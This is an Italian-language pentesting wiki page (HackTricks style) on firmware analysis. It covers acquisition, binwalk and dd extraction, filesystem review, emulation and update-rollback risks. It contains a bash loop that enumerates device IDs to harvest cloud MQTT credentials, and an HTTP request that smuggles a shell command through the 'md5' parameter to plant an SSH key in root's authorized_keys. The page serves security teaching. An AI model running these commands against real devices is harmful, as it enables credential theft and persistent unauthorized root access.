# Analisi del firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introduzione**

### Risorse correlate


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Il firmware è il software essenziale che permette ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui gli utenti interagiscono. Viene memorizzato in memoria permanente, garantendo che il dispositivo possa accedere a istruzioni vitali dal momento dell'accensione, portando al lancio del sistema operativo. Esaminare e potenzialmente modificare il firmware è un passaggio critico per identificare vulnerabilità di sicurezza.

## **Raccolta informazioni**

La **raccolta informazioni** è un passo iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo comporta la raccolta di dati su:

- L'architettura CPU e il sistema operativo in uso
- Specifiche del bootloader
- Layout hardware e datasheet
- Metriche del codebase e posizioni delle sorgenti
- Librerie esterne e tipi di licenza
- Cronologia degli update e certificazioni regolamentari
- Diagrammi architetturali e di flusso
- Valutazioni di sicurezza e vulnerabilità identificate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di qualsiasi componente software open-source disponibile tramite revisioni manuali e automatizzate. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono analisi statica gratuite che possono essere sfruttate per trovare potenziali problemi.

## **Acquisizione del firmware**

Ottenere il firmware può essere affrontato tramite diversi metodi, ciascuno con il proprio livello di complessità:

- **Direttamente** dalla fonte (sviluppatori, produttori)
- **Compilandolo** dalle istruzioni fornite
- **Scaricandolo** dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati
- Accedendo direttamente a **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando **aggiornamenti** tramite tecniche man-in-the-middle
- **Estraendolo** dal dispositivo tramite connessioni come **UART**, **JTAG**, o **PICit**
- **Sniffando** le richieste di update nelle comunicazioni del dispositivo
- Identificando e usando endpoint di update **hardcoded**
- **Dumping** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di memorizzazione, quando tutto il resto fallisce, utilizzando strumenti hardware appropriati

## Analisi del firmware

Ora che **hai il firmware**, è necessario estrarre informazioni su di esso per sapere come trattarlo. Diversi strumenti che puoi usare per questo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con quegli strumenti controlla l'**entropia** dell'immagine con `binwalk -E <bin>`, se l'entropia è bassa probabilmente non è encrypted. Se l'entropia è alta, è probabile che sia encrypted (o compressed in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre **file embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Ottenere il filesystem

Con gli strumenti citati prima come `binwalk -ev <bin>` dovresti essere riuscito a **estrarre il filesystem**.\
Binwalk di solito lo estrae all'interno di una **cartella nominata secondo il tipo di filesystem**, che di solito è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte binwalk **non ha il byte magico del filesystem nelle sue firme**. In questi casi, usa binwalk per **trovare l'offset del filesystem e carve il filesystem compresso** dal binario ed **estrarre manualmente** il filesystem in base al suo tipo usando i passaggi seguenti.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente **dd command** carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, è possibile eseguire il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio sopra)

`$ unsquashfs dir.squashfs`

I file saranno nella directory "`squashfs-root`" successivamente.

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del Firmware

Una volta ottenuto il firmware, è essenziale analizzarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo comporta l'utilizzo di vari strumenti per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti per l'analisi iniziale

Viene fornita una serie di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare dati binari e comprendere i dettagli delle partizioni e dei filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato di cifratura dell'immagine, si controlla l'**entropia** con `binwalk -E <bin>`. Un'entropia bassa suggerisce assenza di cifratura, mentre un'entropia elevata indica possibile cifratura o compressione.

Per estrarre i **file incorporati**, si raccomandano strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del Filesystem

Usando `binwalk -ev <bin>`, è solitamente possibile estrarre il filesystem, spesso in una directory chiamata come il tipo di filesystem (ad esempio, squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa della mancanza dei magic bytes, è necessaria un'estrazione manuale. Questo comporta l'uso di `binwalk` per individuare l'offset del filesystem, seguito dal comando `dd` per ritagliare il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Successivamente, a seconda del tipo di filesystem (es. squashfs, cpio, jffs2, ubifs), vengono usati comandi differenti per estrarre manualmente i contenuti.

### Analisi del filesystem

Con il filesystem estratto, inizia la ricerca di vulnerabilità. Si presta attenzione a network daemons insicuri, credenziali hardcoded, endpoint API, funzionalità del server di update, codice non compilato, script di avvio e binari compilati per analisi offline.

**Posizioni chiave** e **elementi** da ispezionare includono:

- **etc/shadow** e **etc/passwd** per le credenziali utente
- Certificati SSL e chiavi in **etc/ssl**
- File di configurazione e script per potenziali vulnerabilità
- Binari embedded per analisi più approfondite
- Web server e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a scovare informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per analisi firmware complete
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) per analisi statiche e dinamiche

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente che i binari compilati trovati nel filesystem devono essere esaminati per eventuali vulnerabilità. Strumenti come **checksec.sh** per binari Unix e **PESecurity** per binari Windows aiutano a identificare binari non protetti che potrebbero essere sfruttati.

## Recupero della configurazione cloud e delle credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la configurazione per dispositivo da un endpoint cloud che assomiglia a:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Durante l'analisi del firmware potresti scoprire che <token> viene derivato localmente dall'ID del dispositivo usando un segreto hardcoded, per esempio:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Questo schema consente a chiunque conosca deviceId e STATIC_KEY di ricostruire l'URL e recuperare la configurazione cloud, spesso rivelando credenziali MQTT in chiaro e prefissi dei topic.

Procedura pratica:

1) Estrarre deviceId dai log di boot UART

- Collegare un adattatore UART a 3.3V (TX/RX/GND) e acquisire i log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca righe che stampano il cloud config URL pattern e il broker address, per esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperare STATIC_KEY e l'algoritmo del token dal firmware

- Caricare i binari in Ghidra/radare2 e cercare il percorso di configurazione ("/pf/") o l'uso di MD5.
- Confermare l'algoritmo (es., MD5(deviceId||STATIC_KEY)).
- Derivare il token in Bash e convertire il digest in maiuscolo:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Raccogli cloud config e credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusare di plaintext MQTT e weak topic ACLs (se presenti)

- Usa recovered credentials per sottoscrivere maintenance topics e cercare sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerare ID dei dispositivi prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano i byte OUI del vendor/product/tipo seguiti da un suffisso sequenziale.
- Puoi iterare gli ID candidati, derivare token e recuperare le configurazioni programmaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Note
- Ottieni sempre autorizzazione esplicita prima di tentare mass enumeration.
- Preferire emulation o static analysis, quando possibile, per recuperare segreti senza modificare l'hardware target.

Il processo di emulating firmware consente la **dynamic analysis** sia del funzionamento di un dispositivo sia di un singolo programma. Questo approccio può incontrare difficoltà a causa di dipendenze hardware o di architettura, ma trasferire il root filesystem o specifici binaries su un dispositivo con CPU architecture e endianness corrispondenti, come un Raspberry Pi, o su una virtual machine preconfigurata, può facilitare ulteriori test.

### Emulating Individual Binaries

Per esaminare singoli programmi, è fondamentale identificare l'endianness e la CPU architecture del programma.

#### Esempio con architettura MIPS

Per emulare un binary con architettura MIPS, si può usare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare gli strumenti di emulazione necessari:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian) si usa `qemu-mips`, mentre per i binari little-endian la scelta è `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binari ARM il processo è simile: si utilizza l'emulatore `qemu-arm` per l'emulazione.

### Emulazione del sistema completo

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l'emulazione completa del firmware, automatizzando il processo e supportando l'analisi dinamica.

## Analisi dinamica nella pratica

A questo punto si utilizza un ambiente reale o emulato del dispositivo per l'analisi. È essenziale mantenere l'accesso shell al sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo necessari riavvii occasionali dell'emulazione. L'analisi dovrebbe riesaminare il filesystem, sfruttare pagine web e servizi di rete esposti ed esplorare vulnerabilità del bootloader. I test di integrità del firmware sono fondamentali per individuare possibili backdoor.

## Tecniche di analisi a runtime

L'analisi a runtime consiste nell'interagire con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

## Exploitation binaria e PoC

Sviluppare un PoC per vulnerabilità identificate richiede una profonda comprensione dell'architettura target e la programmazione in linguaggi di basso livello. Le protezioni a runtime per i binari nei sistemi embedded sono rare, ma quando presenti possono essere necessarie tecniche come Return Oriented Programming (ROP).

## Sistemi operativi pronti per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti pre-configurati per il testing di sicurezza del firmware, dotati degli strumenti necessari.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a effettuare security assessment e penetration testing di dispositivi Internet of Things (IoT). Ti fa risparmiare tempo fornendo un ambiente pre-configurato con tutti gli strumenti necessari già installati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo per embedded security testing basato su Ubuntu 18.04, preinstallato con tool per il firmware security testing.

## Attacchi di downgrade del firmware e meccanismi di update insicuri

Anche quando un vendor implementa controlli di firma crittografica per le immagini firmware, **la protezione contro il version rollback (downgrade) è frequentemente omessa**. Se il boot- o recovery-loader verifica solo la firma con una chiave pubblica incorporata ma non confronta la *versione* (o un contatore monotono) dell'immagine che viene flashata, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile che mantiene una firma valida**, re-introducendo così vulnerabilità già patchate.

Tipico workflow dell'attacco:

1. **Ottenere un'immagine firmata più vecchia**
* Recuperarla dal portale di download pubblico del vendor, dal CDN o dal sito di supporto.
* Estrarla da applicazioni companion mobile/desktop (es. dentro un APK Android sotto `assets/firmware/`).
* Recuperarla da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Caricare o servire l'immagine al dispositivo** tramite qualsiasi canale di update esposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, ecc.
* Molti dispositivi IoT consumer espongono endpoint HTTP(S) *unauthenticated* che accettano blob firmware codificati in Base64, li decodificano server-side e attivano recovery/upgrade.
3. Dopo il downgrade, sfruttare una vulnerabilità che era stata patchata nella release più recente (per esempio un filtro per command-injection aggiunto successivamente).
4. Eventualmente ripristinare l'ultima immagine o disabilitare gli update per evitare il rilevamento una volta ottenuta la persistenza.

### Esempio: command injection dopo il downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nel firmware vulnerabile (downgraded), il parametro `md5` viene concatenato direttamente in un comando shell senza sanitizzazione, consentendo l'iniezione di comandi arbitrari (qui – abilitando l'accesso root basato su chiave SSH). Versioni successive del firmware hanno introdotto un filtro di caratteri di base, ma l'assenza di protezione contro il downgrade rende la correzione inutile.

### Estrazione del firmware dalle app mobili

Molti vendor includono immagini firmware complete all'interno delle loro companion mobile applications in modo che l'app possa aggiornare il dispositivo via Bluetooth/Wi-Fi. Questi pacchetti sono comunemente memorizzati non criptati nell'APK/APEX sotto percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra`, o anche il semplice `unzip` permettono di estrarre immagini firmate senza toccare l'hardware fisico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist per valutare la logica di aggiornamento

* Il trasporto/l'autenticazione del *update endpoint* è adeguatamente protetto (TLS + autenticazione)?
* Il dispositivo confronta **numeri di versione** o un **contatore anti-rollback monotono** prima del flashing?
* L'immagine è verificata all'interno di una catena di avvio sicuro (es. firme verificate dal codice ROM)?
* Il codice userland esegue controlli di sanità aggiuntivi (es. mappa delle partizioni consentite, numero modello)?
* I flussi di aggiornamento *partial* o *backup* riutilizzano la stessa logica di validazione?

> 💡 Se uno qualsiasi dei punti sopra manca, la piattaforma è probabilmente vulnerabile ad attacchi di rollback.

## Firmware vulnerabile per esercitarsi

Per esercitarsi a scoprire vulnerabilità nel firmware, usa i seguenti progetti di firmware vulnerabile come punto di partenza.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Riferimenti

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Formazione e Certificazione

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
